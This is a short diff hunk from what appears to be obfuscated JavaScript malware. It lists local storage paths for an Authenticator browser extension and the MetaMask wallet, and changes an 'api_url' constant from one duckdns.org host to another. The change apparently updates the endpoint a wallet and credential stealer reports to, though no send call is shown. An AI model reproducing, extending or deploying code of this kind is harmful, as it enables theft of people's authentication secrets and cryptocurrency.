@@ -155,7 +155,7 @@ _0x4ae424.Authenticator_E =
     '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
 _0x4ae424.MetaMask_O =
     '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
-const api_url = "http://xortoproject.duckdns.org";
+const api_url = "xortoproject1.duckdns.org";
 
 const extension = _0x4ae424,
   browserPath = [
